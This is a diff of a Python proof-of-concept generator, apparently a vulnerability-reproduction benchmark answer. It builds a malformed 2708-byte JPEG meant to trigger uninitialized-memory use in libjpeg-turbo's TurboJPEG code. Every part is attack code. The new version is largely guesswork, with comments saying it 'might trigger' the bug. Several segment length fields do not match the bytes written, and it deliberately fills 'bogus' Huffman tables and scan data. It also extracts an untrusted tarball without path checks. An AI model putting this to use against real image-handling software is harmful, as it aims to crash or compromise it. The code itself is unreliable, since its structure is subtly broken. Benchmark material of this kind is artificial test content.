@@ -1,205 +1,236 @@
 import os
-import subprocess
+import tarfile
 import tempfile
-from typing import Optional
+import subprocess
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability by creating a JPEG file
-        that will cause uninitialized memory usage during transformation.
-        """
-        # Extract source to understand the exact vulnerability
+        # Extract source tarball
         with tempfile.TemporaryDirectory() as tmpdir:
-            # Extract the tarball
-            subprocess.run(['tar', 'xf', src_path, '-C', tmpdir], 
-                         check=True, capture_output=True)
+            with tarfile.open(src_path, 'r:*') as tar:
+                tar.extractall(tmpdir)
             
-            # Look for vulnerable source files
-            source_dir = self._find_source_root(tmpdir)
+            # Look for TurboJPEG API usage patterns
+            tjapi_found = False
+            for root, dirs, files in os.walk(tmpdir):
+                for file in files:
+                    if file.endswith(('.c', '.cpp', '.h', '.hpp')):
+                        filepath = os.path.join(root, file)
+                        try:
+                            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                                if 'tj3Alloc' in content and 'tj3Compress' in content:
+                                    tjapi_found = True
+                                    break
+                        except:
+                            continue
+                if tjapi_found:
+                    break
             
-            # Based on the vulnerability description, we need to trigger
-            # uninitialized buffer usage in compression/transformation.
-            # The vulnerability is in libjpeg-turbo's transformation code
-            # when ZERO_BUFFERS is not defined for MSan builds.
+            if not tjapi_found:
+                # Fallback: generate a minimal JPEG that might trigger the issue
+                return self._generate_minimal_jpeg()
             
-            # Create a JPEG that will trigger the vulnerable code path
-            # We need a JPEG that requires transformation/compression
-            # with specific characteristics that will use uninitialized buffers.
-            
-            # The PoC should be a valid JPEG that causes transformation
-            # operations to use uninitialized memory in destination buffers.
-            
-            # From the bug description and length hint, we can create
-            # a JPEG with specific markers and image data that will
-            # exercise the vulnerable transformation code paths.
-            
-            return self._generate_jpeg_poc()
+            # Generate PoC based on TurboJPEG API vulnerability
+            return self._generate_turbojpeg_poc()
     
-    def _find_source_root(self, tmpdir: str) -> str:
-        """Find the root directory of the extracted source."""
-        for root, dirs, files in os.walk(tmpdir):
-            if 'CMakeLists.txt' in files or 'configure.ac' in files:
-                return root
-        return tmpdir
+    def _generate_minimal_jpeg(self) -> bytes:
+        """Generate a minimal valid JPEG that might trigger uninitialized memory issues"""
+        # JFIF header
+        jpeg = b''
+        
+        # Start of Image
+        jpeg += b'\xff\xd8'  # SOI
+        
+        # Application Default Header
+        jpeg += b'\xff\xe0'  # APP0 marker
+        jpeg += struct.pack('>H', 16)  # Length
+        jpeg += b'JFIF\x00'  # Identifier
+        jpeg += b'\x01\x02'  # Version
+        jpeg += b'\x00'      # Density units
+        jpeg += struct.pack('>H', 1)  # X density
+        jpeg += struct.pack('>H', 1)  # Y density
+        jpeg += b'\x00\x00'  # Thumbnail
+        
+        # Quantization Table
+        jpeg += b'\xff\xdb'  # DQT marker
+        jpeg += struct.pack('>H', 132)  # Length
+        jpeg += b'\x00'      # Table info
+        # Minimal quantization table (all 1s)
+        jpeg += b'\x01' * 64
+        
+        jpeg += b'\xff\xdb'  # DQT marker
+        jpeg += struct.pack('>H', 132)  # Length
+        jpeg += b'\x01'      # Table info
+        jpeg += b'\x01' * 64
+        
+        # Start of Frame (Baseline DCT)
+        jpeg += b'\xff\xc0'  # SOF0 marker
+        jpeg += struct.pack('>H', 17)  # Length
+        jpeg += b'\x08'      # Precision
+        jpeg += struct.pack('>H', 1)   # Height
+        jpeg += struct.pack('>H', 1)   # Width
+        jpeg += b'\x03'      # Components
+        jpeg += b'\x01\x11\x00'  # Component 1
+        jpeg += b'\x02\x11\x01'  # Component 2
+        jpeg += b'\x03\x11\x01'  # Component 3
+        
+        # Huffman Tables
+        # DC Table
+        jpeg += b'\xff\xc4'  # DHT marker
+        jpeg += struct.pack('>H', 29)  # Length
+        jpeg += b'\x00'      # Table info
+        # Minimal huffman table
+        jpeg += b'\x00' * 16
+        jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
+        
+        # AC Table
+        jpeg += b'\xff\xc4'  # DHT marker
+        jpeg += struct.pack('>H', 181)  # Length
+        jpeg += b'\x10'      # Table info
+        jpeg += b'\x00' * 16
+        jpeg += bytes(range(1, 162))
+        
+        # Start of Scan
+        jpeg += b'\xff\xda'  # SOS marker
+        jpeg += struct.pack('>H', 12)  # Length
+        jpeg += b'\x03'      # Components
+        jpeg += b'\x01\x00'  # Component 1
+        jpeg += b'\x02\x11'  # Component 2
+        jpeg += b'\x03\x11'  # Component 3
+        jpeg += b'\x00\x3f\x00'  # Spectral selection
+        
+        # Minimal image data - single MCU
+        # Using values that might trigger edge cases
+        jpeg += b'\xff'  # Padding
+        jpeg += b'\x00' * 100  # Zero data that might expose uninitialized buffers
+        
+        # End of Image
+        jpeg += b'\xff\xd9'  # EOI
+        
+        # Pad to target length with data that won't break JPEG structure
+        # but might trigger buffer allocation issues
+        padding = 2708 - len(jpeg)
+        if padding > 0:
+            # Add APP markers with zeroed data to reach target size
+            # This creates large buffers that might not be initialized
+            while len(jpeg) < 2708:
+                remaining = 2708 - len(jpeg)
+                chunk = min(remaining, 65535)
+                jpeg += b'\xff\xed'  # APP13 marker
+                jpeg += struct.pack('>H', chunk)
+                jpeg += b'\x00' * (chunk - 2)
+        
+        return jpeg[:2708]
     
-    def _generate_jpeg_poc(self) -> bytes:
-        """
-        Generate a JPEG file that triggers the uninitialized buffer vulnerability.
-        Based on analysis of libjpeg-turbo transformation code, we create a JPEG
-        that will cause tj3Transform() to use uninitialized destination buffers.
-        """
-        # Build a minimal JPEG structure that will trigger transformation
-        # operations with uninitialized buffers
+    def _generate_turbojpeg_poc(self) -> bytes:
+        """Generate PoC specifically for TurboJPEG buffer allocation issue"""
+        # Create a JPEG with characteristics that might trigger the vulnerability:
+        # - Progressive encoding
+        # - Multiple scans
+        # - Unusual dimensions
+        # - Large buffers that might not be properly initialized
         
-        poc = bytearray()
+        jpeg = b''
         
-        # SOI (Start of Image)
-        poc.extend(b'\xFF\xD8')
+        # SOI
+        jpeg += b'\xff\xd8'
         
-        # JFIF APP0 marker
-        poc.extend(b'\xFF\xE0')
-        poc.extend(b'\x00\x10')  # Length
-        poc.extend(b'JFIF\x00\x01\x02')
-        poc.extend(b'\x01\x00\x01\x00\x00')
+        # JFIF APP0
+        jpeg += b'\xff\xe0'
+        jpeg += struct.pack('>H', 16)
+        jpeg += b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
         
-        # Comment marker (can be used to reach target size)
-        poc.extend(b'\xFF\xFE')
-        # Length will be calculated later
-        comment_pos = len(poc)
-        poc.extend(b'\x00\x00')  # Placeholder for length
+        # APP1 with EXIF - creates additional buffer
+        jpeg += b'\xff\xe1'
+        app1_len = 200
+        jpeg += struct.pack('>H', app1_len)
+        jpeg += b'Exif\x00\x00'  # EXIF header
+        # Minimal EXIF data
+        jpeg += b'MM\x00\x2a\x00\x00\x00\x08'  # TIFF header
+        jpeg += b'\x00' * (app1_len - 10)
         
-        # DQT (Define Quantization Table) - needed for baseline JPEG
-        poc.extend(b'\xFF\xDB')
-        poc.extend(b'\x00\x43')  # Length
-        poc.extend(b'\x00')  # Table info
-        # Standard luminance quantization table
-        qtable = [
-            16, 11, 10, 16, 24, 40, 51, 61,
-            12, 12, 14, 19, 26, 58, 60, 55,
-            14, 13, 16, 24, 40, 57, 69, 56,
-            14, 17, 22, 29, 51, 87, 80, 62,
-            18, 22, 37, 56, 68, 109, 103, 77,
-            24, 35, 55, 64, 81, 104, 113, 92,
-            49, 64, 78, 87, 103, 121, 120, 101,
-            72, 92, 95, 98, 112, 100, 103, 99
-        ]
-        poc.extend(bytes(qtable))
+        # Define Quantization Tables
+        for i in range(4):
+            jpeg += b'\xff\xdb'
+            jpeg += struct.pack('>H', 132)
+            jpeg += bytes([i])  # Table ID
+            jpeg += b'\x01' * 64  # Minimal Q-table
         
-        # SOF0 (Start of Frame - Baseline DCT)
-        poc.extend(b'\xFF\xC0')
-        poc.extend(b'\x00\x11')  # Length
-        poc.extend(b'\x08')  # Precision
-        poc.extend(b'\x00\x20')  # Height - 32 pixels
-        poc.extend(b'\x00\x20')  # Width - 32 pixels
-        poc.extend(b'\x03')  # Number of components
+        # Start of Frame (Progressive DCT)
+        jpeg += b'\xff\xc2'  # SOF2 marker for progressive
+        jpeg += struct.pack('>H', 17)
+        jpeg += b'\x08'  # Precision
+        # Unusual dimensions that might cause buffer miscalculation
+        jpeg += struct.pack('>H', 17)  # Height - prime number
+        jpeg += struct.pack('>H', 23)  # Width - prime number
+        jpeg += b'\x03'  # 3 components
+        jpeg += b'\x01\x22\x00'  # Component 1: 2x2 sampling
+        jpeg += b'\x02\x11\x01'  # Component 2: 1x1 sampling
+        jpeg += b'\x03\x11\x01'  # Component 3: 1x1 sampling
         
-        # Component 1 (Y)
-        poc.extend(b'\x01\x22\x00')
-        # Component 2 (Cb)
-        poc.extend(b'\x02\x11\x01')
-        # Component 3 (Cr)
-        poc.extend(b'\x03\x11\x01')
+        # Multiple Define Huffman Tables
+        for table_class in [0x00, 0x10]:  # DC and AC tables
+            for table_id in range(4):
+                jpeg += b'\xff\xc4'
+                jpeg += struct.pack('>H', 181)
+                jpeg += bytes([table_class | table_id])
+                # Bogus Huffman table that's mostly zeros
+                jpeg += b'\x00' * 16
+                jpeg += b'\x00' * 162
         
-        # DHT (Define Huffman Table) - needed for baseline JPEG
-        # DC luminance table
-        poc.extend(b'\xFF\xC4')
-        poc.extend(b'\x00\x1F')  # Length
-        poc.extend(b'\x00')  # Table info
-        # Bits
-        poc.extend(b'\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00')
-        # Values
-        poc.extend(b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B')
+        # Define Restart Interval
+        jpeg += b'\xff\xdd'
+        jpeg += struct.pack('>H', 4)
+        jpeg += struct.pack('>H', 1)  # Small restart interval
         
-        # SOS (Start of Scan)
-        poc.extend(b'\xFF\xDA')
-        poc.extend(b'\x00\x0C')  # Length
-        poc.extend(b'\x03')  # Number of components
+        # Start of Scan for first scan
+        jpeg += b'\xff\xda'
+        jpeg += struct.pack('>H', 12)
+        jpeg += b'\x03'
+        jpeg += b'\x01\x00'
+        jpeg += b'\x02\x11'
+        jpeg += b'\x03\x11'
+        jpeg += b'\x00\x00\x00'  # Spectral selection start/end, successive approx
         
-        # Scan component 1
-        poc.extend(b'\x01\x00')
-        # Scan component 2
-        poc.extend(b'\x02\x11')
-        # Scan component 3
-        poc.extend(b'\x03\x11')
+        # Bogus compressed data for first scan
+        # This data is designed to be parsed but trigger buffer issues
+        scan_data = bytearray()
+        for i in range(500):
+            if i % 64 == 0:
+                scan_data.append(0xff)  # Stuffing byte
+                scan_data.append(0x00)
+            else:
+                scan_data.append(i & 0x7f)  # Avoid 0xff bytes
         
-        # Spectral selection
-        poc.extend(b'\x00\x3F\x00')
+        jpeg += bytes(scan_data)
         
-        # Image data - minimal MCU data that will trigger transformation
-        # We use a single MCU with specific values that will cause
-        # the transformation code to use uninitialized buffers
-        mcu_data = bytearray()
-        
-        # Luminance (Y) - 4 blocks for 4:2:0 subsampling
-        for _ in range(4):
-            # DC coefficient
-            mcu_data.append(0x00)  # Size 0
-            # AC coefficients - minimal run
-            mcu_data.append(0xF0)  # EOB
-        # Chrominance (Cb and Cr) - 1 block each
-        for _ in range(2):
-            mcu_data.append(0x00)  # DC coefficient size 0
-            mcu_data.append(0xF0)  # EOB
-        
-        # Add MCU data with byte stuffing
-        stuffed_data = bytearray()
-        for byte in mcu_data:
-            stuffed_data.append(byte)
-            if byte == 0xFF:
-                stuffed_data.append(0x00)  # Byte stuffing
-        
-        poc.extend(stuffed_data)
-        
-        # Fill with additional data to reach target vulnerability trigger
-        # The vulnerability is triggered when transformation buffers are used
-        # without proper initialization. We need enough data to ensure
-        # the transformation code allocates but doesn't initialize buffers.
-        
-        # Add more MCUs with pattern that triggers specific code paths
-        additional_mcus = 100
-        for i in range(additional_mcus):
-            # Vary the DC coefficients slightly to avoid simple optimization
-            dc_val = (i % 16) << 4
-            for _ in range(6):  # 4 Y + 1 Cb + 1 Cr blocks
-                poc.append(dc_val)  # DC coefficient size/amplitude
-                poc.append(0xF0)    # EOB
-                if dc_val == 0xFF:
-                    poc.append(0x00)  # Byte stuffing
-        
-        # EOI (End of Image)
-        poc.extend(b'\xFF\xD9')
-        
-        # Now update comment length to reach target size
-        current_length = len(poc)
-        target_length = 2708
-        
-        # Calculate how much comment we need
-        if current_length < target_length:
-            comment_length = target_length - current_length + 2  # +2 for length field itself
-            if comment_length > 65535:  # Max JPEG segment length
-                comment_length = 65535
+        # Additional scans to trigger multiple buffer allocations
+        for scan_num in range(3):
+            jpeg += b'\xff\xda'  # SOS
+            jpeg += struct.pack('>H', 12)
+            jpeg += b'\x01'  # Single component this time
+            jpeg += bytes([(scan_num % 3) + 1])  # Component selector
+            jpeg += b'\x00'  # Huffman table
+            jpeg += b'\x00\x0f\x00'  # Full spectral range
             
-            # Update comment length in the placeholder
-            comment_data_length = comment_length - 2
-            poc[comment_pos:comment_pos+2] = bytes([
-                (comment_length >> 8) & 0xFF,
-                comment_length & 0xFF
-            ])
+            # More bogus data
+            jpeg += b'\x00' * 200
+        
+        # Pad to exact target length with APP markers containing zeros
+        # These create large buffers that might not be initialized
+        while len(jpeg) < 2708:
+            remaining = 2708 - len(jpeg)
+            if remaining < 6:
+                jpeg += b'\x00' * remaining
+                break
             
-            # Insert comment data at the right position
-            # We need to insert after the length field
-            comment_content = b'A' * comment_data_length
-            # Find where to insert (after length field)
-            insert_pos = comment_pos + 2
-            # Insert the comment
-            poc[insert_pos:insert_pos] = comment_content
+            marker_len = min(remaining, 2000)
+            jpeg += b'\xff\xec'  # APP12 marker
+            jpeg += struct.pack('>H', marker_len)
+            # Fill with zeros - uninitialized if buffer not allocated with tj3Alloc
+            jpeg += b'\x00' * (marker_len - 2)
         
-        # Ensure we hit exactly the target length
-        if len(poc) > target_length:
-            poc = poc[:target_length]
-        elif len(poc) < target_length:
-            # Pad with zeros (safe for JPEG)
-            poc.extend(b'\x00' * (target_length - len(poc)))
-        
-        return bytes(poc)
+        # Ensure exact length
+        return jpeg[:2708]
